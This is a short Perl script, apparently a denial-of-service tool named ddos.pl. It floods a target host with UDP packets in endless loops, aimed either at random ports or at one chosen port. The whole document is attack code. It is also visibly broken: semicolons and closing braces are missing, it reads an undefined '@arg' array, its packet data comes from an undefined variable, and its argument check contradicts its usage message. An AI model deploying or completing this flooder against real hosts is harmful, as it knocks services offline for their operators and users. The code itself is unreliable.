use Socket;

$args = @ARGV;

if ($args <= 2 || $args >= 4) {
    print "Usage: ddos.pl <host> <port>\n";
    exit(0);
}

my $host = $ARGV[0];
my $port = $ARGV[1];
my $time = $ARGV[2];

socket(crazy, PF_INET, SOCK_DGRAM, 17);
$inet = inet_aton($host);

printf("[+] Connecting to %s:%d\n", $host, $port);
if (($arg[1] == 0 && $arg[2] == 0) || ($arg[1] == 0 && $arg[2] != 0)) {
    system("(sleep $time;killall -9 udp) &");
    for (;;) {
        $packet_size = $rand x $rand x $rand
        $random_port = int(rand(65535));
        send(crazy, 0, $packet_size, sockaddr_in($random_port, $inet));
    }

if ($arg[1] != 0 && $arg[2] == 0) {
    for (;;) {
        $packet_size = $rand x $rand x $rand
        send(crazy, 0, $packet_size, sockaddr_in($port, $inet));
    }